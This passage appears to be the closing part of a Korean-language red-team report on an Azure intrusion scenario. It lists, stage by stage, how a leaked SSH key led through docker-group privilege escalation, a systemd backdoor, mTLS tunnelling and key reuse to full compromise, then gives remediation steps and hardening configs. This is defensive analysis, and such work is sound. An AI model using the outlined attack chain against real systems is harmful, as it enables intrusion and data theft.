    *   Jumpbox VM에서 DB 서버로 향하는 SSH 접속은 관리 목적 외에는 차단되어야 하며, 데이터 전송(SCP)과 같은 대용량 트래픽 발생 시 경보를 울려야 한다.
*   **DLP (Data Loss Prevention):**
    *   DB 덤프 파일(.sql, .gz)과 같은 민감한 파일 형식이 내부망을 이동하거나 외부로 유출되는 것을 탐지해야 한다.

---

## 8. 종합 분석 및 권고 사항

### 8.1. 종합 위협 분석: "ID가 새로운 보안 경계"의 붕괴

본 공격 시나리오는 단 하나의 **유출된 SSH 키**가 어떻게 기업의 모든 기술적 방어 체계를 무력화시키고 내부망 전체를 붕괴시키는지를 명확하게 보여주었다. 이번 작전에서 식별된 방어 체계의 구조적 실패 요인은 다음과 같다.

1.  **IaC 보안 관리 실패:** Terraform 코드 관리 프로세스에 **시크릿 스캐닝**이 부재하여, 생성된 SSH 키가 아무런 통제 없이 외부로 유출될 수 있는 환경이었다.
2.  **자격 증명 관리 실패:**
    *   **단일 인증 요소:** Jumpbox VM 접근에 MFA 없이 SSH 키 단독 인증만 사용했다.
    *   **자격 증명 재사용:** **가장 치명적인 문제**로, Jumpbox, Web, DB 서버 전체에 동일한 SSH 키를 재사용하여, 초기 침투가 곧 전체 시스템 장악으로 이어지는 최악의 조건을 만들었다.
3.  **최소 권한 원칙 위배:** `azureadmin` 계정에 불필요하게 강력한 `docker` 그룹 권한을 부여하여, 공격자에게 손쉬운 `root` 권한 획득 경로를 제공했다.

### 8.2. Kill Chain 단계별 방어 실패 분석

| 단계 | 공격 기법 | 방어 실패 원인 |
| :--- | :--- | :--- |
| **Recon** | GitHub Scanning | IaC 코드 내 Secret Scanning 부재. |
| **Delivery** | SSH Login | MFA 부재 및 Source IP 제한 미흡. |
| **Exploitation** | Docker PrivEsc | 사용자에게 과도한 그룹 권한(docker) 부여. |
| **Installation** | Systemd Backdoor | 호스트 FIM 및 서비스 감사 부재. |
| **C2** | mTLS Tunneling | 아웃바운드 트래픽 통제 미흡. |
| **Action** | Lateral Movement | 서버 간 동일 SSH 키 재사용. |

### 8.3. 보안 강화 로드맵

#### Phase 1: 긴급 조치 (24h)
**목표:** 현재 위협 제거 및 출혈 차단

1. **자격 증명 전면 교체:** 유출된 키 쌍을 즉시 폐기하고, 모든 서버의 SSH 키를 고유한 키로 재발급
   ```bash
   for server in $(az vm list...); do az vm user update...; done
   ```
2. **권한 축소:** 모든 사용자 계정에서 `docker` 그룹 권한 즉시 제거 (`gpasswd -d azureadmin docker`)
3. **Jumpbox 접근 통제:** SSH Key 인증 외 Azure AD(Entra ID) 기반 MFA 또는 NSG 소스 IP 제한 긴급 적용

#### Phase 2: 구조 개선 (1 Month)
**목표:** 공격 난이도 상향 및 내부 확산 방지

1. **Secret Scanning 자동화:** GitHub Actions에 `TruffleHog` 스캔을 통합하여, Pull Request 생성 시 민감 정보가 포함되면 Merge를 자동 차단(Gatekeeping)
2. **JIT(Just-In-Time) VM Access 도입:** Microsoft Defender for Cloud의 JIT 기능을 활성화하여 상시 열려있는 SSH 포트를 제거하고, 감사된 요청에 대해서만 한시적으로 접근 허용
3. **SSH 인증서 기반 접근:** 단기 수명(Short-lived)의 SSH 인증서를 발급하는 중앙 CA(예: HashiCorp Vault, Teleport)를 구축하여 키 관리 부담 제거

#### Phase 3: 체질 개선 (6 Months)
**목표:** 제로 트러스트 아키텍처로의 전환

1. **PIM(Privileged Identity Management):** Azure PIM을 도입하여 상시 관리자 권한을 제거하고, 작업 시 승인/감사 절차를 거쳐 권한을 부여받고 자동 회수되는 체계 구축
2. **코드형 보안:** CI/CD 파이프라인에 `Checkov`, `tfsec`과 같은 IaC 스캔 도구를 통합하여, "docker 그룹에 사용자 추가"와 같은 위험한 설정이 포함된 Terraform 코드가 배포되기 전에 차단
3. **내부망 가시성 확보:** Azure Network Watcher와 Sentinel을 연동하여 내부 서브넷 간의 트래픽(East-West)을 분석하고, 비정상적인 프로토콜/볼륨 통신에 대한 자동 경보 체계 수립

### 8.4. 기술적 세부 권고

**1. SSH 보안 설정 강화 (`/etc/ssh/sshd_config`):**
```bash
# 루트 로그인 차단
PermitRootLogin no

# 비밀번호 인증 차단 (키 기반 인증 강제)
PasswordAuthentication no

# 특정 그룹만 접속 허용
AllowGroups ssh-users

# 최대 인증 시도 횟수 제한
MaxAuthTries 3
```

**2. TruffleHog GitHub Action 설정 예시:**
```yaml
name: Secret Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0
      - uses: trufflesecurity/trufflehog@main
        with:
          extra_args: --only-verified
```

### 8.5. 결론

Credential Abuse 시나리오는 **"가장 강력한 방화벽도 유출된 자격 증명 앞에서는 무용지물"**이라는 보안의 격언을 상기시킨다. 공격은 기술적 해킹이 아닌, 관리의 허점을 파고드는 **'신원 공격'**이었다. 이제 보안의 패러다임은 네트워크 경계 방어에서 **'모든 신원을 의심하고 검증하는'** 방향으로 전환되어야 하며, 특히 인프라 코드와 개발 파이프라인 단계에서부터 보안을 내재화하는 **시프트-레프트 보안**의 도입이 시급하다.